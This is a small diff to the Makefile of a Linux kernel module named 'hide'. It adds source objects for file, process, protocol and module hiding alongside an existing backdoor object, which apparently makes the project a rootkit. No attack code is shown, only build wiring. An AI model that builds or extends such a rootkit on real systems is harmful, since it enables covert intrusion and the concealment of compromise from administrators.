@@ -1,6 +1,8 @@
 obj-m := hide.o
 
-hide-objs := ./src/hide.o ./src/backdoor.o
+hide-objs := ./src/hide.o ./src/backdoor.o ./src/fake.o \
+./src/filehide.o ./src/prochide.o ./src/protocolhide.o \
+./src/modhide.o ./src/protect.o
 
 cc = gcc -Wall
 KDIR := /lib/modules/$(shell uname -r)/build
